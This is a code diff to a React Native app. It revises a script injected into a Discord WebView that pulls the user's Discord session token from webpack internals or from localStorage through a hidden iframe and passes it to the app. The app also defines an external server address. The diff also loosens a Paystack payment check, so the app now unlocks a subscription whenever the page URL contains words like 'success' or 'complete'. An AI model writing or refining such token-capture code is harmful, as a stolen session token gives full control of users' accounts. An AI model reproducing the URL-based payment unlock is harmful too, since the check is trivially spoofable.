@@ -39,60 +39,61 @@ export default function App() {
   const API_URL = "https://intelligent-gratitude-production.up.railway.app";
 
   // --- IMPROVED SCRIPT: Target UserStore directly ---
+  // Focus ONLY on the token since we generate the email from user_id on the backend
   const INJECTED_JAVASCRIPT = `
   (function() {
-    let attempts = 0;
     function capture() {
       try {
         let token = null;
-        let email = null;
         const webpack = window.webpackChunkdiscord_app;
-        
         if (webpack) {
           const m = webpack.push([[Symbol()], {}, (e) => e]);
           for (const i in m.c) {
-            const exp = m.c[i].exports;
-            if (exp && exp.default && typeof exp.default === 'object') {
-              // Get Token
-              if (exp.default.getToken) token = exp.default.getToken();
-              
-              // Get Email (Try multiple known internal paths)
-              if (exp.default.getCurrentUser) {
-                const u = exp.default.getCurrentUser();
-                if (u && u.email) email = u.email;
-              }
-              if (!email && exp.default.getEmail) email = exp.default.getEmail();
+            if (m.c[i].exports && m.c[i].exports.default && m.c[i].exports.default.getToken) {
+              token = m.c[i].exports.default.getToken();
+              if (token) break;
             }
           }
         }
-
-        // Token Fallback
         if (!token) {
           const iframe = document.createElement('iframe');
-          iframe.style.display = 'none';
-          document.body.appendChild(iframe);
+          iframe.style.display = 'none'; document.body.appendChild(iframe);
           const raw = iframe.contentWindow.localStorage.getItem('token');
           if (raw) token = raw.replace(/"/g, '');
         }
 
         if (token && token.length > 20) {
-          attempts++;
-          // Send if we have email OR if we've tried for 8 seconds
-          if (email || attempts > 16) {
-            window.ReactNativeWebView.postMessage(JSON.stringify({
-              type: 'TOKEN_DATA', 
-              token: token, 
-              email: email || "user@discord.com" 
-            }));
-            return true;
-          }
+          window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: token}));
+          return true;
         }
       } catch (e) {}
       return false;
     }
-    const timer = setInterval(() => { if (capture()) clearInterval(timer); }, 500);
+    setInterval(capture, 1000);
   })();
 `;
+
+  // --- IMPROVED: Catch Paystack success more reliably ---
+  const handlePaystackNavigation = (navState) => {
+    const url = navState.url.toLowerCase();
+    // Check for common redirect success patterns
+    if (
+      url.includes("success") ||
+      url.includes("callback") ||
+      url.includes("checkout.paystack.com/success") ||
+      url.includes("successful") ||
+      url.includes("completed") ||
+      url.includes("complete")
+    ) {
+      setTimeout(() => {
+        setPaystackUrl(null);
+        setIsSubscribed(true);
+        fetchMoves();
+        Alert.alert("Success", "Account unlocked!");
+      }, 2500); // Small delay to let Paystack finish its visual "Success" animation
+    }
+  };
+
 
   useEffect(() => {
     registerForNotifications();
@@ -195,24 +196,6 @@ export default function App() {
       }
     } catch (e) {
       Alert.alert("Error", "Server unreachable.");
-    }
-  };
-
-  // --- IMPROVED: Catch Paystack success more reliably ---
-  const handlePaystackNavigation = (navState) => {
-    const url = navState.url.toLowerCase();
-    // Check for common redirect success patterns
-    if (
-      url.includes("success") ||
-      url.includes("callback") ||
-      url.includes("checkout.paystack.com/success")
-    ) {
-      setTimeout(() => {
-        setPaystackUrl(null);
-        setIsSubscribed(true);
-        fetchMoves();
-        Alert.alert("Success", "Account unlocked!");
-      }, 2000); // Small delay to let Paystack finish its visual "Success" animation
     }
   };
 
